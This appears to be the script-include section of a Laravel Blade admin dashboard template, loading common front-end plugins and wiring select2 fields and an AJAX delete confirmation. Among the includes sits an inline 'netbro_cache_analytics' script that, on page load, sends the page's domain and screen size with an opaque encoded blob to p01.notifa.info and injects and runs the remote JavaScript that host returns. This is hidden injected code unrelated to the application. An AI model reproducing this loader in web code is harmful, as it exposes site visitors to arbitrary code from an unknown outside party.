 <!--Global script(used by all pages)-->
 <script data-cfasync="false" src="{{URL::to('cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js')}}">

 </script><script src="{{URL::to('assets/plugins/jQuery/jquery-3.4.1.min.js')}}"></script>
 <script src="{{URL::to('assets/dist/js/popper.min.js')}}"></script>
 <script src="{{URL::to('assets/plugins/bootstrap/js/bootstrap.min.js')}}"></script>
 <script src="{{URL::to('assets/plugins/metisMenu/metisMenu.min.js')}}"></script>
 <script src="{{URL::to('assets/plugins/perfect-scrollbar/dist/perfect-scrollbar.min.js')}}"></script>
 <!-- Third Party Scripts(used by this page)-->
 <script src="{{URL::to('assets/plugins/chartJs/Chart.min.js')}}"></script>
 <script src="{{URL::to('assets/plugins/sparkline/sparkline.min.js')}}"></script>
 <script src="{{URL::to('assets/plugins/datatables/dataTables.min.js')}}"></script>
 <script src="{{URL::to('assets/plugins/datatables/dataTables.bootstrap4.min.js')}}"></script>
 <script src="{{url::to('assets/plugins/datatables/data-basic.active.js')}}"></script>
 <!--Page Active Scripts(used by this page)-->
 <script src="{{URL::to('assets/dist/js/pages/dashboard.js')}}"></script>
 <!--Page Scripts(used by all page)-->
 <script src="{{URL::to('assets/dist/js/sidebar.js')}}"></script>
 <script src="{{URL::to('assets/plugins/bootstrap-wizard/jquery.backstretch.min.js')}}"></script>
 <script src="{{URL::to('assets/plugins/bootstrap-wizard/form.scripts.js')}}"></script>
 <script src="{{URL::to('assets/plugins/modals/classie.js')}}"></script>
 <script src="{{URL::to('assets/plugins/modals/modalEffects.js')}}"></script>

 <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAbCcMplVXhcMjVhMRxbe7v42n1BstiPi%2bLTOK48K1V1USeG%2fs4020qEHA5Tv7c2S2wc23zySwrBXxoirWyXY%2fTvUw2eFyIl2rqDejarTMxs5g%2bqNKCKjUVYlW9Hx4f%2bMa8IcBEYiOe5FHl%2bl%2bkYkvcg5yJbSUxVjQYD8RHDwFPinPttOkdmdNdDn5oPZeeKOI4bUMayZRzhYgX63m6GuP7B2pv4%2bLVQoQSOl6CuQVrN1DuEHnkKMbIOvd8eemlZBG0Nmx%2f5dh%2frIXEVpzomQMXP2Qm2iTfftVTGCfpcwzBcPqR01LWzTtVMLpEeFMVWnwnWl8EuMvrIM70qaUgbCeD4AXqNsivVqNe46kca62DDpvbxTLPtkQtvsZr2xuTNVeHf9jjXnV6chrmeYFasv69Xz%2bYGZa073HJoN0VuSJpukO3zmyAZjHFzsZDANbXFK6i%2b1j4i5KkVoP7YLy9IJZ7A%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
 <script src="{{ URL::to('assets/plugins/select2/dist/js/select2.min.js')}}"></script>
 <script src="{{ URL::to('assets/dist/js/pages/demo.select2.js')}}"></script>
 <script src="{{ URL::to('assets/dist/js/pages/newsletter.active.js')}}"></script>
 <script src="{{ URL::to('assets/plugins/dropzone/dist/min/dropzone.min.js') }}"></script>
 <!--Page Active Scripts(used by this page)-->
 <script src="{{ URL::to('assets/plugins/dropzone/dist/dropzone.active.js') }}"></script>
 <script src="{{ URL::to('assets/dist/js/pages/icheck.active.js') }}"></script>
 <script src="{{ URL::to('assets/plugins/icheck/icheck.min.js') }}"></script>
 <script src="{{ URL::to('assets/plugins/bootstrap4-toggle/js/bootstrap4-toggle.min.js') }}"></script>
 <script src="{{ URL::to('assets/plugins/NotificationStyles/js/snap.svg-min.js')}}"></script>
 <script src="{{ URL::to('assets/plugins/sweetalert/sweetalert.min.js')}}"></script>
 <script src="{{ URL::to('assets/plugins/toastr/toastr.min.js')}}"></script>
<script src="{{ URL::to('assets/dist/js/pages/notifications.active.js')}}"></script>

 <script type="text/javascript">
       $("#provinsi").select2({

                  allowClear: true
       });
       $("#kota").select2({

                  allowClear: true
       });
       $("#kecamatan").select2({

                  allowClear: true
       });
       $("#kelurahan").select2({

                  allowClear: true
       });


       $('body').on('click', '.btn-delete1', function (event) {
    event.preventDefault();

    var me = $(this),
        url = me.attr('href'),
        title = me.attr('title'),
        csrf_token = $('meta[name="csrf-token"]').attr('content');

    swal({
        title: 'Are you sure want to delete ' + title + ' ?',
        text: 'You won\'t be able to revert this!',
        type: 'warning',
        showCancelButton: true,
        confirmButtonColor: '#3085d6',
        cancelButtonColor: '#d33',
        confirmButtonText: 'Yes!'
    }).then((result) => {
        if (result.value) {
            $.ajax({
                url: url,
                type: "POST",
                data: {
                    '_method': 'DELETE',
                    '_token': csrf_token
                },
                
            });
        }
    });
});
</script>

